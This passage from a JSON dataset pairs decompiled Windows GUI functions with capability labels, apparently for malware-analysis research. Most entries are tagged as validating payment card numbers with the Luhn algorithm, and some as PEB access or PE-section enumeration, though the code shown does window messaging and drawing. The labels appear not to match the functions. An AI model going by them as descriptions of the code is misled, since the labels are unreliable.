        "decompiled_code": "\nvoid __fastcall fcn.0046d09c(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_20h = 0;\n    uStack64 = 0x46d12c;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_1ch = 8;\n    uVar1 = fcn.0044d1c8(0x1306, param_2, &fcn.0046d09c::var_1ch);\n    arg_8h = 0x46d0e0;\n    iVar2 = sub.user32.dll_SendMessageA(uVar1);\n    if (iVar2 == 0) {\n        arg_8h = &fcn.0046d09c::var_20h;\n        fcn.00406a50();\n        fcn.00409c80(arg_8h);\n        fcn.0046cce4();\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404dc4(0x46d133);\n    return;\n}\n",
        "token_count": 342
    },
    "0046d88c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0046d88c(uint param_1, int16_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int16_t extraout_DX;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed8;\n    uint *arg_ch;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_10ch;\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x46d92a;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    puVar1 = &stack0xfffffffc;\n    if (param_2 != *(in_EAX + 0x276)) {\n        puVar1 = &stack0xfffffffc;\n        if (param_2 < 0) {\n            fcn.00403e38();\n            var_8h = &var_108h;\n            var_4h._0_1_ = 4;\n            arg_ch = &var_8h;\n            in_stack_fffffed8 = 0;\n            fcn.00406a50();\n            fcn.0040c5e8(in_stack_fffffed8, arg_ch);\n            fcn.004047cc();\n            param_2 = extraout_DX;\n            puVar1 = puStack280;\n        }\n        puStack280 = puVar1;\n        *(in_EAX + 0x276) = param_2;\n        fcn.0046daf8();\n        puVar1 = puStack280;\n    }\n    puStack280 = puVar1;\n    *in_FS_OFFSET = in_stack_fffffed8;\n    uStack288 = 0x46d931;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 430
    },
    "0046d9f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0046d9f4(uint param_1, int16_t param_2)\n\n{\n    int16_t iVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int16_t extraout_DX;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed8;\n    uint *arg_ch;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_10ch;\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x46daac;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    puVar2 = &stack0xfffffffc;\n    if (param_2 != *(in_EAX + 0x274)) {\n        puVar2 = &stack0xfffffffc;\n        if (param_2 < 0) {\n            fcn.00403e38();\n            var_8h = &var_108h;\n            var_4h._0_1_ = 4;\n            arg_ch = &var_8h;\n            in_stack_fffffed8 = 0;\n            fcn.00406a50();\n            fcn.0040c5e8(in_stack_fffffed8, arg_ch);\n            fcn.004047cc();\n            param_2 = extraout_DX;\n            puVar2 = puStack280;\n        }\n        puStack280 = puVar2;\n        iVar1 = *(in_EAX + 0x274);\n        *(in_EAX + 0x274) = param_2;\n        if ((iVar1 == 0) || (param_2 == 0)) {\n            fcn.00449ecc();\n            puVar2 = puStack280;\n        }\n        else {\n            fcn.0046daf8();\n            puVar2 = puStack280;\n        }\n    }\n    puStack280 = puVar2;\n    *in_FS_OFFSET = in_stack_fffffed8;\n    uStack288 = 0x46dab3;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 495
    },
    "0046db20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0046db20(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint arg_8h;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    var_24h = 0;\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    var_20h = 2;\n    iVar1 = (**(*in_EAX[0x9c] + 0x14))();\n    if (-1 < iVar1 + -1) {\n        iVar2 = 0;\n        var_4h = iVar1;\n        do {\n            var_ch = (**(*in_EAX + 0xe0))();\n            arg_8h = fcn.0044d1c8();\n            iVar1 = sub.user32.dll_SendMessageA();\n            if (iVar1 == 0) {\n                (**(*in_EAX[0x9c] + 0xc))(&var_24h);\n                var_34h = 0;\n                var_30h._0_1_ = 0xb;\n                var_28h._0_1_ = 0;\n                var_2ch = iVar2;\n                fcn.00406a50(&var_34h);\n                fcn.00409c80(arg_8h);\n                fcn.0046cce4();\n            }\n            iVar2 = iVar2 + 1;\n            var_4h = var_4h + -1;\n        } while (var_4h != 0);\n    }\n    fcn.0046dab8();\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404dc4();\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 470
    },
    "0046de84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046de84(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x46df59;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    var_8h = (**(*in_EAX[0x9c] + 0x14))();\n    if (-1 < var_8h + -1) {\n        do {\n            (**(*in_EAX[0x9c] + 0xc))();\n            cVar1 = fcn.00458370();\n            if (((cVar1 != '\\0') && (cVar1 = (**(*in_EAX + 0xd8))(),  cVar1 != '\\0')) &&\n               (cVar1 = fcn.00404154(),  cVar1 != '\\0')) {\n                *(param_2 + 0xc) = 1;\n                cVar1 = fcn.00404154();\n                if (cVar1 != '\\0') {\n                    (**(*in_EAX + 0xe4))();\n                    fcn.00404154();\n                }\n                goto code_r0x0046df43;\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    fcn.0044c61c();\ncode_r0x0046df43:\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x46df60;\n    uStack36 = 0x46df58;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 430
    },
    "0046e030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046e030(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.004483a4();\n    fcn.004448f8();\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) | *0x46e094;\n    fcn.004454cc();\n    *(in_EAX + 600) = 1;\n    *(in_EAX + 0x25a) = 0;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 211
    },
    "0046e23c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e23c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iStack28;\n    uchar uStack24;\n    int32_t iStack20;\n    uchar uStack16;\n    \n    if (*(in_EAX + 0x254) != 0) {\n        iVar1 = *(*(*(in_EAX + 0x254) + 0x2b0) + 8) + -1;\n        if (iVar1 < param_2) {\n            uStack24 = 0;\n            uStack16 = 0;\n            iStack28 = param_2;\n            iStack20 = iVar1;\n            fcn.0040c6a4(1, &iStack28);\n            fcn.004047cc();\n        }\n        iVar1 = fcn.0046e140();\n        fcn.0046e124();\n        fcn.00414fe0();\n        if (-1 < iVar1) {\n            fcn.0046e140();\n            fcn.0046ec3c();\n        }\n    }\n    return;\n}\n",
        "token_count": 255
    },
    "0046e928": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046e928(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t in_EDX;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uVar1 = fcn.0044d1c8(&var_14h);\n    sub.user32.dll_GetWindowRect(uVar1);\n    *(in_EDX + 0x4c) = var_14h;\n    *(in_EDX + 0x50) = uStack20;\n    *(in_EDX + 0x54) = uStack16;\n    *(in_EDX + 0x58) = uStack12;\n    fcn.00404154(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 197
    },
    "0046eb68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046eb68(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_ch = *arg_ch;\n    uStack12 = arg_ch[1];\n    iVar1 = fcn.0046eaf4();\n    *arg_8h = iVar1 == 0;\n    fcn.0044bbb4(arg_8h, &var_ch);\n    return;\n}\n",
        "token_count": 114
    },
    "0046ef40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046ef40(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    puStack56 = &stack0xfffffffc;\n    uStack36 = 0x46f0ce;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    *(param_2 + 0xc) = 0;\n    iVar1 = *(*(param_2 + 4) + 0x40);\n    puStack44 = 0x46ef77;\n    iVar3 = fcn.0046eb5c();\n    if (-1 < iVar3 + -1) {\n        do {\n            puStack44 = 0x46ef8b;\n            iVar4 = fcn.0046eb44();\n            if (iVar4 == *(iVar1 + 0x30)) {\n                puStack44 = 0x46ef9d;\n                puStack44 = fcn.0046eb44();\n                uStack48 = 0x46efa6;\n                fcn.0046eb5c();\n                puStack44 = 0x46efaf;\n                fcn.0046e23c();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x46f0d5;\n                uStack36 = 0x46f0cd;\n                fcn.00404da0();\n                return;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    puStack44 = 0x46efc7;\n    uVar5 = fcn.0046e030();\n    *(in_EAX + 0x2b8) = uVar5;\n    uStack48 = 0x46f0b1;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x46f045;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack44 = &stack0xfffffffc;\n    cVar2 = fcn.004040e4();\n    if (cVar2 != '\\0') {\n        fcn.004455ac();\n        fcn.004455dc();\n    }\n    fcn.0046e208();\n    fcn.00404154();\n    *in_FS_OFFSET = uStack64;\n    cVar2 = *(iVar1 + 0x57);\n    puStack56 = 0x46f079;\n    fcn.0046e314();\n    if (cVar2 != '\\0') {\n        puStack56 = 0x46f08e;\n        fcn.0046ecf8();\n    }\n    puStack56 = 0x46f098;\n    fcn.004448f8();\n    *in_FS_OFFSET = uStack52;\n    *(in_EAX + 0x2b8) = 0;\n    return;\n}\n",
        "token_count": 782
    },
    "0046f5a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046f5a0(int32_t *param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    if (param_1 == NULL) {\n        fcn.00415a48();\n    }\n    else {\n        (**(*param_1 + 0xe4))();\n        fcn.00415a48();\n    }\n    *(in_EAX + 0x18) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 215
    },
    "0046ff3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046ff3c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(param_2 + 8);\n    uStack28 = *(iVar1 + 0x18);\n    puStack32 = 0x46ff5e;\n    uVar2 = sub.gdi32.dll_SaveDC();\n    puStack32 = 0x46ff6f;\n    fcn.00421928();\n    uStack36 = 0x470032;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00421d14();\n    fcn.00421b80();\n    fcn.004214d4();\n    fcn.004215f0();\n    fcn.0046f60c();\n    fcn.00404154();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x470039;\n    uStack36 = 0x470013;\n    fcn.00421d14();\n    uStack36 = 0x470021;\n    fcn.00421b58();\n    uStack40 = *(iVar1 + 0x18);\n    uStack36 = uVar2;\n    sub.gdi32.dll_RestoreDC();\n    return;\n}\n",
        "token_count": 368
    },
    "00472374": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00472374(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t arg_8h;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint32_t uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint32_t uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x472388;\n    fcn.00472ea8();\n    uStack32 = 0x47245f;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = 0x47239e;\n    puStack28 = &stack0xfffffffc;\n    fcn.0044d1a4();\n    uStack40 = 0xfffffff0;\n    uStack44 = 0x4723a8;\n    uStack44 = fcn.0044d1c8();\n    uStack48 = 0x4723ae;\n    uVar1 = sub.user32.dll_GetWindowLongA();\n    uStack48 = uVar1 & 0xefffffff;\n    uStack52 = 0xfffffff0;\n    uStack56 = 0x4723c4;\n    uStack56 = fcn.0044d1c8();\n    puStack60 = 0x4723ca;\n    sub.user32.dll_SetWindowLongA();\n    uStack64 = 0x472442;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack60 = &stack0xfffffffc;\n    iVar2 = fcn.00472ef4();\n    iVar4 = *(*(in_EAX + 0x268) + 8);\n    if (-1 < iVar4 + -1) {\n        arg_8h = 0;\n        do {\n            if (arg_8h < iVar2) {\n                fcn.00471f44(arg_8h);\n            }\n            else {\n                fcn.00471d1c(arg_8h);\n            }\n            arg_8h = arg_8h + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    *in_FS_OFFSET = uStack68;\n    puStack60 = 0x472449;\n    uStack68 = 0xfffffff0;\n    uStack64 = uVar1;\n    uVar3 = fcn.0044d1c8();\n    sub.user32.dll_SetWindowLongA(uVar3);\n    return;\n}\n",
        "token_count": 634
    },
    "00472478": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00472478(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uchar auStack28 [20];\n    \n    iVar1 = fcn.00446870(auStack28);\n    if (iVar1 != 0) {\n        fcn.00470b74();\n        uVar2 = fcn.00470a60();\n        uVar2 = uVar2 & 0xff;\n        fcn.00471004();\n        fcn.00446870(uVar2);\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "004726a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004726a4(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *arg_8h_00;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack44 = 0x4726bb;\n    var_8h = fcn.00426010();\n    uStack48 = 0x472789;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.00453888();\n    (**(*var_8h + 0x40))();\n    (**(*var_8h + 0x34))();\n    arg_8h_00 = &fcn.004726a4::var_18h;\n    fcn.00406c18(arg_8h_00, *(*(arg_8h + -4) + 0x4c));\n    fcn.004265e4();\n    fcn.004214d4();\n    fcn.00421878();\n    iVar1 = fcn.00453888();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            fcn.004265e4(*(in_EAX + 0x34) * iVar3, 0, 1);\n            uVar2 = fcn.00421c8c();\n            arg_8h_00 = fcn.00453564(iVar3, uVar2);\n            sub.comctl32.dll_ImageList_Draw();\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    var_4h = fcn.00427a58();\n    *in_FS_OFFSET = arg_8h_00;\n    iStack52 = 0x472790;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 487
    },
    "0047279c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047279c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStackY56;\n    int32_t iStackY52;\n    uint *arg_8h;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (param_2 != 0) {\n        iStackY52 = 0x4727b1;\n        var_4h = in_EAX;\n        var_1ch = fcn.004726a4(&stack0xfffffffc);\n        var_24h = *(var_4h + 0x2b8);\n        var_10h = var_1ch;\n        if (var_24h == 0) {\n            var_ch = 0;\n            arg_8h = &fcn.0047279c::var_ch;\n            iStackY52 = 0x472831;\n            var_8h = var_1ch;\n            fcn.00472594();\n            iStackY52 = 0x472840;\n            fcn.00446870(arg_8h);\n        }\n        else {\n            var_28h = 0;\n            var_20h = 0;\n            var_18h = fcn.00472594();\n            iStackY52 = 0x472873;\n            fcn.00446870(&fcn.0047279c::var_28h);\n            iStackY52 = *(var_4h + 0x2b8);\n            if (iStackY52 != 0) {\n                uStackY56 = 0x472886;\n                sub.gdi32.dll_DeleteObject();\n            }\n        }\n        *(var_4h + 0x2b8) = var_10h;\n        return;\n    }\n    var_14h = fcn.00426010();\n    iStackY52 = 0x472806;\n    uStackY56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    (**(*var_14h + 8))();\n    var_10h = fcn.00427a58();\n    *in_FS_OFFSET = uStackY56;\n    iStackY52 = 0x472805;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 574
    },
    "0047304c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0047304c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EDX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x473067;\n    var_8h = fcn.00472f04(arg_8h);\n    if (in_EDX != var_8h) {\n        if (in_EDX < var_8h) {\n            var_8h = var_8h + -1;\n        }\n        puStack28 = 0x47308b;\n        fcn.00414eec();\n        puStack28 = 0x47309d;\n        fcn.00414dd8();\n        puStack28 = 0x4730b0;\n        fcn.00414f68();\n        puStack28 = 0x4730b8;\n        fcn.00472ea8();\n        uStack32 = 0x473101;\n        iStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        fcn.00446870(0);\n        fcn.00471d1c(var_8h);\n        *in_FS_OFFSET = var_8h;\n        iStack36 = 0x473108;\n        iVar1 = fcn.00472eb0();\n        return iVar1;\n    }\n    return var_8h;\n}\n",
        "token_count": 355
    },
    "00473900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00473900(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t *in_EDX;\n    int32_t iVar2;\n    bool bVar3;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00406c34();\n    fcn.00406c34();\n    var_8h = 0;\n    fcn.004736d4(arg_8h);\n    fcn.00473488(arg_8h);\n    fcn.004736d4(arg_8h);\n    fcn.00473488(arg_8h);\n    do {\n        while( true ) {\n            if (var_10h <= var_18h) {\n                return var_8h;\n            }\n            iVar2 = var_18h + var_10h >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((var_18h + var_10h & 1U) != 0);\n            }\n            var_8h = fcn.004736d4(arg_8h);\n            fcn.00473488(arg_8h);\n            if (var_1ch <= *in_EDX) break;\n            if ((var_18h == iVar2) && (var_14h == var_1ch)) {\n                uVar1 = fcn.004736d4(arg_8h);\n                return uVar1;\n            }\n            var_14h = var_1ch;\n            var_20h = iVar2;\n            var_18h = iVar2;\n        }\n        if (*in_EDX <= var_1ch) {\n            return var_8h;\n        }\n        bVar3 = var_20h != iVar2;\n        var_20h = iVar2;\n        var_10h = iVar2;\n    } while (bVar3);\n    return var_8h;\n}\n",
        "token_count": 482
    },
    "00473a1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00473a1c(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    bool bVar7;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar6 = 0;\n    iVar4 = *in_EAX;\n    iVar1 = fcn.004736d4(arg_8h);\n    iVar2 = fcn.004736d4(arg_8h);\n    if ((iVar1 != iVar2) && (0 < iVar4)) {\n        do {\n            iVar2 = iVar4 + iVar6 >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((iVar4 + iVar6 & 1U) != 0);\n            }\n            iVar3 = fcn.004736d4(arg_8h);\n            iVar5 = iVar2;\n            if ((iVar3 != iVar1) && (bVar7 = iVar2 == iVar6,  iVar5 = iVar4,  iVar6 = iVar2,  bVar7)) {\n                fcn.004736d4(arg_8h);\n                break;\n            }\n            iVar4 = iVar5;\n        } while (iVar6 < iVar5);\n    }\n    fcn.00473488(arg_8h);\n    fcn.004736d4(arg_8h);\n    return 0;\n}\n",
        "token_count": 357
    },
    "00474aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00474aa0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.00403720();\n    var_2ch = fcn.0044d1c8();\n    var_28h = fcn.0044d1c8();\n    var_24h = 0xfffffd3a;\n    var_20h = fcn.00471004();\n    uVar1 = fcn.0044d1c8(&var_2ch);\n    uVar1 = fcn.0044d1c8(0x4e, uVar1);\n    sub.user32.dll_SendMessageA(uVar1);\n    return;\n}\n",
        "token_count": 179
    },
    "0047671c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047671c(uint param_1, uchar param_2)\n\n{\n    uint uVar1;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack20 = 0x80000001;\n    uStack16 = fcn.00405264();\n    uStack12 = fcn.00405264();\n    uVar1 = fcn.0044d1c8(0x41a, param_2, &uStack20);\n    sub.user32.dll_SendMessageA(uVar1);\n    return;\n}\n",
        "token_count": 128
    },
    "00476c08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid fcn.00476c08(void)\n\n{\n    float10 in_ST0;\n    uint var_8h;\n    \n    fcn.00403160(in_ST0);\n    return;\n}\n",
        "token_count": 58
    },
    "00476c8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00476c8c(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x476cf1;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    var_8h = *(*in_EAX + 0x14);\n    var_4h._0_1_ = 0;\n    arg_ch = &var_8h;\n    arg_8h = 0;\n    fcn.00406a50();\n    fcn.0040c5e8(arg_8h, arg_ch);\n    fcn.004047cc();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x476cf8;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 255
    },
    "00476d50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00476d50(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0042322c();\n    fcn.00477d20();\n    *(in_EAX + 0x3f) = *0x491ef4;\n    *(in_EAX + 0x3d) = *0x491ef5;\n    *(in_EAX + 0x42) = *0x491ef6;\n    *(in_EAX + 0x3e) = *0x491ef7;\n    *(in_EAX + 0x40) = *0x491ef8;\n    *(in_EAX + 0x41) = *0x491ef9;\n    *(in_EAX + 0x43) = *0x491efa;\n    *(in_EAX + 0x3c) = *0x491efb;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 299
    },
    "00477728": {
        "rules": [
